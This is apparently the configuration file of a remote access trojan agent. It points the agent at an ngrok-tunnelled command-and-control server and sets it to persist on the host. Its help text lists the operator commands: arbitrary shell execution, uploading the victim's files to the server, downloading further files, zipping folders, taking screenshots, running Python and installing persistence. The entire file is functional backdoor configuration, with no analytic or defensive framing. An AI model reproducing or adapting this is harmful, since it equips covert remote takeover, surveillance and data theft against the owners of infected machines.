SERVER = "http://f6a71da61c1d.ngrok.io"
HELLO_INTERVAL = 1
IDLE_TIME = 1
MAX_FAILED_CONNECTIONS = 20
PERSIST = True
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

python <command|file>
Runs a Python command or local file.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.
"""
